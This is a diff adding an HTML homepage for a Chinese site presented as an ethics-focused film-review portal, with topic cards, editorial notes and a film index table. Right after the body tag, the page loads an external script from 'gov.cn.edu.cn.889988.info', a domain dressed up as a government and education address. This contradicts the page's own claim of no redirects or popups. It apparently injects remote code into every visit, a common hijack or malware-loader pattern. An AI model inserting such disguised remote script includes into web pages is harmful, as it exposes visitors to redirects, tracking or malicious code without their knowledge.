@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<title>八戒伦理电影网｜聚焦人性叙事与伦理议题的影视评论聚合站 - bajielunlidianyingwang-zh.github.io</title>
+<meta name="description" content="八戒伦理电影网（bajielunlidianyingwang-zh.github.io）是一家以伦理题材影视作品为观察切口的评论型内容站点。我们围绕家庭伦理、婚姻抉择、道德困境、代际冲突与社会关系等议题，系统整理国内外伦理电影、电视剧与相关纪录影像的资料、看点解析与观影笔记。内容强调客观陈述与多元视角，帮助读者在观看之外，理解影像背后关于人性与抉择的讨论。">
+<meta name="keywords" content="八戒伦理电影网,伦理电影,伦理剧,家庭伦理,婚姻题材,道德困境,人性电影,影视评论,bajielunlidianyingwang-zh.github.io">
+<meta name="author" content="八戒伦理电影网">
+<meta name="copyright" content="Copyright © 2026 八戒伦理电影网">
+<meta name="robots" content="index,follow">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#1a1208">
+<link rel="canonical" href="https://bajielunlidianyingwang-zh.github.io/">
+<style>
+:root{
+  --paper:#F4EEE4;
+  --paper-2:#EDE5D8;
+  --ink:#1a1208;
+  --ink-2:#4a3c2a;
+  --rust:#9C4A2C;
+  --rust-l:#C06A42;
+  --line:#D8CBB6;
+  --shadow:0 2px 0 rgba(26,18,8,.08);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","SimSun","Noto Serif CJK SC","Source Han Serif SC","PingFang SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.85;
+  font-size:16px;overflow-x:hidden;
+}
+body::selection,body *::selection{background:var(--rust);color:#fff}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+
+/* ── 顶部通栏 ── */
+.masthead{
+  border-bottom:3px double var(--ink);
+  padding:18px clamp(16px,5vw,56px) 14px;
+  display:flex;align-items:flex-end;justify-content:space-between;gap:20px;
+  background:var(--paper);position:sticky;top:0;z-index:40;
+}
+.mast-l .kicker{font-size:11px;letter-spacing:.4em;color:var(--rust);text-transform:uppercase}
+.mast-l h1{
+  font-size:clamp(24px,4.6vw,40px);font-weight:900;letter-spacing:.08em;
+  margin-top:4px;line-height:1.2;
+}
+.mast-l h1 em{font-style:normal;color:var(--rust)}
+.mast-r{text-align:right;font-size:12px;color:var(--ink-2);line-height:1.7}
+.mast-r b{display:block;font-size:13px;color:var(--ink);letter-spacing:.05em}
+.navbar{
+  display:flex;gap:2px;flex-wrap:wrap;
+  padding:0 clamp(16px,5vw,56px);
+  border-bottom:1px solid var(--line);
+  background:var(--paper-2);
+}
+.navbar a{
+  padding:11px 16px;font-size:14px;letter-spacing:.1em;color:var(--ink-2);
+  border-right:1px solid var(--line);transition:all .2s;
+}
+.navbar a:first-child{border-left:1px solid var(--line)}
+.navbar a:hover{background:var(--rust);color:#fff}
+
+/* ── 报头区 ── */
+.lede{
+  padding:56px clamp(16px,5vw,56px) 40px;
+  border-bottom:1px solid var(--line);
+  display:grid;grid-template-columns:1.5fr 1fr;gap:44px;align-items:end;
+}
+.lede h2{
+  font-size:clamp(30px,5.4vw,58px);line-height:1.2;font-weight:900;letter-spacing:.02em;
+}
+.lede h2 small{display:block;font-size:.38em;color:var(--rust);letter-spacing:.2em;margin-bottom:14px;font-weight:700}
+.lede p{font-size:16px;color:var(--ink-2);border-left:3px solid var(--rust);padding-left:18px}
+
+/* ── 栏目通用 ── */
+section{padding:64px clamp(16px,5vw,56px)}
+.belt{background:var(--ink);color:var(--paper);padding:10px clamp(16px,5vw,56px);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
+.belt b{font-size:13px;letter-spacing:.3em;color:var(--rust-l)}
+.belt span{font-size:12px;opacity:.7;letter-spacing:.1em}
+.sec-title{display:flex;align-items:baseline;gap:14px;margin-bottom:34px;flex-wrap:wrap}
+.sec-title .no{
+  font-size:13px;background:var(--ink);color:var(--paper);
+  padding:4px 10px;letter-spacing:.2em;
+}
+.sec-title h3{font-size:clamp(22px,3.4vw,30px);font-weight:900;letter-spacing:.06em}
+.sec-title em{font-style:normal;color:var(--rust);font-size:14px;margin-left:auto;letter-spacing:.1em}
+
+/* 栏目一 · 议题矩阵 */
+.matrix{display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--ink);border-left:1px solid var(--ink)}
+.cell{
+  border-right:1px solid var(--ink);border-bottom:1px solid var(--ink);
+  padding:26px 22px;min-height:180px;display:flex;flex-direction:column;
+  transition:background .3s;cursor:default;
+}
+.cell:hover{background:var(--rust);color:#fff}
+.cell:hover .tag{background:#fff;color:var(--rust)}
+.cell .tag{font-size:11px;letter-spacing:.2em;color:#fff;background:var(--ink);padding:3px 9px;align-self:flex-start;margin-bottom:14px;transition:.3s}
+.cell h4{font-size:19px;font-weight:800;margin-bottom:8px;letter-spacing:.04em}
+.cell p{font-size:13.5px;opacity:.85;flex:1}
+.cell .more{margin-top:14px;font-size:12px;font-weight:700;letter-spacing:.1em}
+
+/* 栏目二 · 近期笔记 */
+.notes{display:grid;grid-template-columns:repeat(3,1fr);gap:26px}
+.note{border-top:4px solid var(--ink);padding-top:18px;transition:transform .3s}
+.note:hover{transform:translateY(-5px)}
+.note .date{font-size:12px;color:var(--rust);letter-spacing:.1em;margin-bottom:8px}
+.note h4{font-size:20px;font-weight:800;line-height:1.4;margin-bottom:10px}
+.note p{font-size:14.5px;color:var(--ink-2)}
+.note .by{margin-top:16px;padding-top:12px;border-top:1px dashed var(--line);font-size:12px;color:var(--ink-2);display:flex;justify-content:space-between}
+
+/* 栏目三 · 影片索引 */
+.index-hd{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:14px;margin-bottom:6px}
+.tabs{display:flex;gap:8px;flex-wrap:wrap}
+.tabs a{font-size:13px;border:1px solid var(--ink);padding:6px 14px;transition:.2s}
+.tabs a:hover,.tabs a.on{background:var(--ink);color:var(--paper)}
+table{width:100%;border-collapse:collapse;font-size:14px}
+table th,table td{padding:13px 12px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top}
+table th{background:var(--ink);color:var(--paper);font-size:12px;letter-spacing:.1em;font-weight:600}
+table tr:hover td{background:var(--paper-2)}
+table .score{color:var(--rust);font-weight:800;white-space:nowrap}
+.more-row{text-align:center;padding:24px 0 0}
+.more-row a{font-size:13px;border-bottom:1px solid var(--ink);padding-bottom:3px;letter-spacing:.1em}
+
+/* 栏目四 · 站点说明 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:52px}
+.about-block h4{font-size:17px;font-weight:800;margin-bottom:12px;padding-left:12px;border-left:4px solid var(--rust)}
+.about-block p{font-size:15px;color:var(--ink-2);margin-bottom:14px}
+.about-block ul li{padding:9px 0 9px 20px;position:relative;font-size:14.5px;border-bottom:1px dotted var(--line)}
+.about-block ul li::before{content:"▸";position:absolute;left:0;color:var(--rust);font-weight:700}
+.contact-box{border:2px solid var(--ink);padding:26px;background:var(--paper-2)}
+.contact-box dt{font-size:12px;letter-spacing:.2em;color:var(--rust);margin-top:16px}
+.contact-box dt:first-child{margin-top:0}
+.contact-box dd{font-size:16px;font-weight:700;letter-spacing:.04em}
+.contact-box dd.url{font-size:15px;color:var(--rust);word-break:break-all}
+
+/* 栏目五 · 浏览指引 */
+.guide{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--ink)}
+.guide div{padding:26px 22px;border-right:1px solid var(--ink)}
+.guide div:last-child{border-right:none}
+.guide i{font-style:normal;font-size:30px;font-weight:900;color:var(--line);display:block;line-height:1}
+.guide h5{font-size:16px;margin:12px 0 8px;letter-spacing:.06em}
+.guide p{font-size:13.5px;color:var(--ink-2)}
+
+/* 页脚 */
+footer{background:var(--ink);color:var(--paper);padding:44px clamp(16px,5vw,56px) 28px}
+.foot{max-width:1400px;margin:0 auto}
+.foot-top{display:flex;justify-content:space-between;flex-wrap:wrap;gap:24px;padding-bottom:26px;border-bottom:1px solid rgba(244,238,228,.18)}
+.foot-top b{font-size:20px;letter-spacing:.1em}
+.foot-top a{font-size:13px;opacity:.75;margin-left:18px;transition:.2s}
+.foot-top a:hover{opacity:1;color:var(--rust-l)}
+.foot-bot{display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px;padding-top:22px;font-size:12.5px;opacity:.6;letter-spacing:.05em}
+.foot-bot .site-url{color:var(--rust-l);opacity:1;font-weight:700}
+
+/* 响应式 */
+@media (max-width:900px){
+  .lede{grid-template-columns:1fr;gap:24px}
+  .matrix{grid-template-columns:repeat(2,1fr)}
+  .notes{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr;gap:32px}
+  .guide{grid-template-columns:repeat(2,1fr)}
+  .guide div{border-bottom:1px solid var(--ink)}
+  .guide div:nth-child(2){border-right:none}
+  table{font-size:13px}
+  table th:nth-child(3),table td:nth-child(3){display:none}
+}
+@media (max-width:560px){
+  .masthead{flex-direction:column;align-items:flex-start}
+  .mast-r{text-align:left}
+  .navbar a{padding:10px 12px;font-size:13px}
+  .matrix{grid-template-columns:1fr}
+  .guide{grid-template-columns:1fr}
+  .guide div{border-right:none}
+  .belt{flex-direction:column;align-items:flex-start}
+  .foot-top a{margin-left:0;margin-right:16px;display:inline-block}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="masthead">
+  <div class="mast-l">
+    <div class="kicker">Ethics in Cinema · 影像中的伦理观察</div>
+    <h1>八戒<em>伦理</em>电影网</h1>
+  </div>
+  <div class="mast-r">
+    <b>站点入口</b>
+    bajielunlidianyingwang-zh.github.io<br>
+    以影像为镜 · 观照人性与抉择
+  </div>
+</header>
+
+<nav class="navbar">
+  <a href="#matrix">议题矩阵</a>
+  <a href="#notes">近期笔记</a>
+  <a href="#index">影片索引</a>
+  <a href="#about">站点说明</a>
+  <a href="#guide">浏览指引</a>
+  <a href="#access">访问入口</a>
+</nav>
+
+<section class="lede">
+  <h2><small>VOL.06 · 2026 年秋季号</small>我们不评价对错<br>只呈现<em style="color:var(--rust)">抉择</em>的重量</h2>
+  <p>八戒伦理电影网聚焦那些把人推向两难境地的影像：当家庭、婚姻、血缘与责任发生碰撞，镜头如何记录下无法被简单归类的选择。这里没有标准答案，只有值得反复咀嚼的叙事细节与人物弧光。</p>
+</section>
+
+<div class="belt">
+  <b>SECTION 01 — 议题矩阵</b>
+  <span>按主题检索 · 六类核心伦理议题</span>
+</div>
+
+<section id="matrix">
+  <div class="sec-title">
+    <span class="no">01</span>
+    <h3>议题矩阵</h3>
+    <em>每个议题对应一组值得讨论的作品</em>
+  </div>
+  <div class="matrix">
+    <div class="cell">
+      <span class="tag">FAMILY</span>
+      <h4>家庭与代际</h4>
+      <p>父权结构下的服从与反抗，亲子之间未说出口的期待，以及沉默如何在一代人之间传递。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">MARRIAGE</span>
+      <h4>婚姻与背叛</h4>
+      <p>从忠诚的边界到情感的退场，婚姻题材影片如何呈现承诺背后的成本核算与人性弱点。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">MORALITY</span>
+      <h4>道德困境</h4>
+      <p>当两种"正确"彼此冲突，角色如何做出选择，以及这些选择又将他们推向怎样的代价。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">GENDER</span>
+      <h4>性别与身份</h4>
+      <p>在传统期待与自我认同之间，影像如何记录个体为争取主体性的漫长努力与微小胜利。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">AGING</span>
+      <h4>衰老与照护</h4>
+      <p>关于失能、记忆消退与家庭照护负担的叙事，往往比青春题材更接近多数人的真实处境。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">CLASS</span>
+      <h4>阶层与欲望</h4>
+      <p>金钱、资源与机会的不平等如何在亲密关系中制造权力倾斜，又被镜头不动声色地记录。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">TRUTH</span>
+      <h4>真相与谎言</h4>
+      <p>为了保护某人而隐瞒，为了维系关系而编造——谎言有时也是伦理困境的一部分。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+    <div class="cell">
+      <span class="tag">FAITH</span>
+      <h4>信仰与世俗</h4>
+      <p>当个人信念与世俗规则发生冲突，影片如何处理信念的坚定与由此带来的现实代价。</p>
+      <div class="more">延伸阅读 →</div>
+    </div>
+  </div>
+</section>
+
+<div class="belt">
+  <b>SECTION 02 — 近期笔记</b>
+  <span>编辑部手记 · 更新于 2026 年 09 月</span>
+</div>
+
+<section id="notes">
+  <div class="sec-title">
+    <span class="no">02</span>
+    <h3>近期笔记</h3>
+    <em>三篇近期更新 · 观点仅代表作者</em>
+  </div>
+  <div class="notes">
+    <article class="note">
+      <div class="date">2026 · 09 · 24</div>
+      <h4>《燃烧》之后：东亚家庭片中"缺席的父亲"叙事为何持续有效</h4>
+      <p>父亲形象的长期空缺，如何成为当代东亚家庭伦理片中最稳定的情感引擎，以及它遮蔽了哪些更复杂的结构性问题。</p>
+      <div class="by"><span>撰文 · 沈青禾</span><span>阅读 12 分钟</span></div>
+    </article>
+    <article class="note">
+      <div class="date">2026 · 09 · 17</div>
+      <h4>婚姻题材的三次转向：从道德审判到情境理解</h4>
+      <p>近二十年的婚姻伦理片，正在从"谁对谁错"的二元判断，转向对情境压力与人性弱点的更宽容呈现。</p>
+      <div class="by"><span>撰文 · 周漫</span><span>阅读 9 分钟</span></div>
+    </article>
+    <article class="note">
+      <div class="date">2026 · 09 · 09</div>
+      <h4>照护者视角：那些被镜头注意到的"中间一代"</h4>
+      <p>上有老下有小的夹心层，在影视作品中多以功能性角色出现。本文梳理近年少数把他们当作主角的中外作品。</p>
+      <div class="by"><span>撰文 · 林屿</span><span>阅读 15 分钟</span></div>
+    </article>
+  </div>
+</section>
+
+<div class="belt">
+  <b>SECTION 03 — 影片索引</b>
+  <span>精选片目 · 可按类型与年代筛选</span>
+</div>
+
+<section id="index">
+  <div class="sec-title">
+    <span class="no">03</span>
+    <h3>影片索引</h3>
+    <em>按议题关联度整理，非排行榜</em>
+  </div>
+  <div class="index-hd">
+    <div class="tabs">
+      <a href="#" class="on">全部</a>
+      <a href="#">家庭伦理</a>
+      <a href="#">婚姻题材</a>
+      <a href="#">道德困境</a>
+      <a href="#">社会议题</a>
+    </div>
+  </div>
+  <table>
+    <thead>
+      <tr><th>片名</th><th>类型 / 年代</th><th>核心议题</th><th>编辑评分</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>海边的曼彻斯特</td><td>剧情 · 2016</td><td>愧疚与自我放逐</td><td class="score">9.1</td></tr>
+      <tr><td>一次别离</td><td>剧情 · 2011</td><td>阶层、信仰与婚姻</td><td class="score">9.3</td></tr>
+      <tr><td>三块广告牌</td><td>犯罪 / 剧情 · 2017</td><td>愤怒与救赎的可能</td><td class="score">8.8</td></tr>
+      <tr><td>婚姻故事</td><td>剧情 · 2019</td><td>离婚中的权力与体面</td><td class="score">8.9</td></tr>
+      <tr><td>小偷家族</td><td>剧情 · 2018</td><td>血缘之外的家庭定义</td><td class="score">9.2</td></tr>
+      <tr><td>燃烧女子的肖像</td><td>剧情 · 2019</td><td>凝视、凝视的回应与女性主体性</td><td class="score">8.7</td></tr>
+      <tr><td>都灵之马</td><td>剧情 · 2011</td><td>苦难中的尊严与日常</td><td class="score">8.4</td></tr>
+      <tr><td>驾驶我的车</td><td>剧情 · 2021</td><td>丧亲、沉默与重述创伤</td><td class="score">8.9</td></tr>
+    </tbody>
+  </table>
+  <div class="more-row"><a href="#">查看完整索引（共 300+ 条目）→</a></div>
+</section>
+
+<div class="belt">
+  <b>SECTION 04 — 关于本站</b>
+  <span>内容边界 · 更新机制 · 联系渠道</span>
+</div>
+
+<section id="about">
+  <div class="sec-title">
+    <span class="no">04</span>
+    <h3>关于本站</h3>
+    <em>定位说明与内容边界</em>
+  </div>
+  <div class="about">
+    <div>
+      <div class="about-block">
+        <h4>我们做什么</h4>
+        <p>八戒伦理电影网是一个以"伦理议题"为索引维度的影视评论内容站点。我们不以播放量为导向，而是把每部作品放回它提出的问题之中：人物为何如此选择，这些选择又揭示了怎样的时代与处境。</p>
+        <ul>
+          <li>按议题归类影片，提供看点解析与讨论角度</li>
+          <li>编辑部持续产出原创影评、导演与演员访谈札记</li>
+          <li>收录经典老片与近年新作的对照阅读建议</li>
+          <li>所有内容均为文字性评论，不涉及在线播放服务</li>
+        </ul>
+      </div>
+      <div class="about-block" style="margin-top:32px">
+        <h4>内容边界</h4>
+        <p>本站讨论的是影像所呈现的伦理议题，而非对现实人物与事件的价值判断。涉及敏感题材时，我们优先采用影片文本分析与学术化表述，避免猎奇化与情绪化措辞。</p>
+      </div>
+    </div>
+    <div>
+      <div class="about-block">
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#">议题矩阵 · 六大伦理主题</a></li>
+          <li><a href="#">近期笔记 · 编辑部手记</a></li>
+          <li><a href="#">影片索引 · 300+ 条目</a></li>
+          <li><a href="#">访谈札记 · 创作者对话</a></li>
+          <li><a href="#">经典重读 · 老片新看</a></li>
+          <li><a href="#">站点说明 · 关于我们</a></li>
+        </ul>
+      </div>
+      <dl class="contact-box" style="margin-top:26px">
+        <dt>更新频率</dt><dd>每周三篇原创内容 · 每周一更新片单</dd>
+        <dt>内容授权</dt><dd>转载请保留署名与原文链接</dd>
+        <dt>读者反馈</dt><dd>来信请说明所针对的篇目与观点</dd>
+      </dl>
+    </div>
+  </div>
+</section>
+
+<div class="belt">
+  <b>SECTION 05 — 浏览指引</b>
+  <span>四种方式 · 找到你想读的内容</span>
+</div>
+
+<section id="guide">
+  <div class="guide">
+    <div>
+      <i>01</i>
+      <h5>按议题找</h5>
+      <p>不确定看什么时，先从议题矩阵入手，按你此刻关心的话题缩小范围。</p>
+    </div>
+    <div>
+      <i>02</i>
+      <h5>按片名找</h5>
+      <p>已有目标影片，可直接在影片索引中按年代与类型交叉筛选。</p>
+    </div>
+    <div>
+      <i>03</i>
+      <h5>按观点读</h5>
+      <p>想看深度解读而非简介，前往近期笔记与经典重读栏目。</p>
+    </div>
+    <div>
+      <i>04</i>
+      <h5>订阅更新</h5>
+      <p>本站不设弹窗与强制跳转，建议将站点地址加入收藏夹定期回访。</p>
+    </div>
+  </div>
+</section>
+
+<div class="belt">
+  <b>SECTION 06 — 访问入口</b>
+  <span>官方站点 · 唯一地址</span>
+</div>
+
+<section id="access">
+  <div class="sec-title">
+    <span class="no">06</span>
+    <h3>访问入口</h3>
+    <em>认准官方站点地址</em>
+  </div>
+  <div class="about">
+    <div>
+      <p style="font-size:16px;color:var(--ink-2)">八戒伦理电影网采用静态页面形式托管，官方入口仅有一个。本站不设置镜像站、不通过第三方短链跳转，访问时请注意核对地址栏中的完整域名，避免误入仿冒页面。</p>
+      <p style="font-size:16px;color:var(--ink-2);margin-top:16px">为便于后续回访，建议将下方官方网址添加到浏览器收藏夹。站点内容随编辑部更新持续扩充，回流读者可获得更完整的索引与评论积累。</p>
+    </div>
+    <dl class="contact-box">
+      <dt>网站名称</dt>
+      <dd>八戒伦理电影网</dd>
+      <dt>官方网址</dt>
+      <dd class="url">https://bajielunlidianyingwang-zh.github.io</dd>
+      <dt>站点形式</dt>
+      <dd>静态单页 · 无弹窗 · 无强制跳转</dd>
+      <dt>适配说明</dt>
+      <dd>支持手机、平板与桌面端自适应浏览</dd>
+    </dl>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div class="foot-top">
+      <b>八戒伦理电影网</b>
+      <div>
+        <a href="#">议题矩阵</a>
+        <a href="#">近期笔记</a>
+        <a href="#">影片索引</a>
+        <a href="#">经典重读</a>
+        <a href="#">关于本站</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>本站内容为编辑观点，不代表任何发行方立场 · 转载请保留署名与原文链接</span>
+      <span class="site-url">https://bajielunlidianyingwang-zh.github.io</span>
+    </div>
+    <div class="foot-bot" style="padding-top:12px">
+      <span>Copyright © 2026 八戒伦理电影网 版权所有 · 保留一切权利</span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
